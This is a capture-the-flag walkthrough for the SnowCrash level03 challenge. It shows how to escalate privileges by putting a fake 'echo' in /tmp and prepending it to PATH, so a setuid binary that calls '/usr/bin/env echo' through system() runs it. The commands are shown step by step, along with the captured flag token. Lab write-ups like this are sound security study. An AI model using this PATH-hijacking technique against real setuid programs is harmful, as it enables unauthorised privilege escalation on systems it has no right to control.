# in the home directory we see an executable binary whose owner is flag03 and setuid permission is set
# which means the program runs with flag03's privileges

level03@SnowCrash:~$ ls -l level03 
-rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03
level03@SnowCrash:~$ file level03
level03: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x3bee584f790153856e826e38544b9e80ac184b7b, not stripped
level03@SnowCrash:~$ 

# running strings or ltrace on the binary we notice that the binary executes the following command: '/usr/bin/env echo Exploit me' with system function
# having '/usr/bin/env' means that even echo is a builtin command the path resolution process is forced, and this is the vulnerability

# we'll try to create a binary named echo that runs the command: '/bin/getflag'
# the problem is that many directories including the home are not writable

# by running this command, we find that /tmp and /run/lock are both writable but /tmp is not readable
find / -type d -writable 2>/dev/null

# we create our file.c and compile it to 'echo' inside /run/lock and then we move it to /tmp (why? because it can't run in /run/lock but it runs in /tmp)
mv echo /tmp

# we still need to update the PATH variable to include /tmp as the first path (shells try paths from left to right)
export PATH=/tmp:$PATH

# now let's run the ~/level03 binary, this time the shell searches and finds /tmp/echo as a good match (it should be executable)
# and since /tmp/echo executes /bin/getflag with flag03 privileges (since the program is setuid and the owner is flag03), we get the flag

level03@SnowCrash:~$ cd ~
level03@SnowCrash:~$ ./level03 
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
level03@SnowCrash:~$ su level04
Password: 
level04@SnowCrash:~$ 

# level04 unlocked
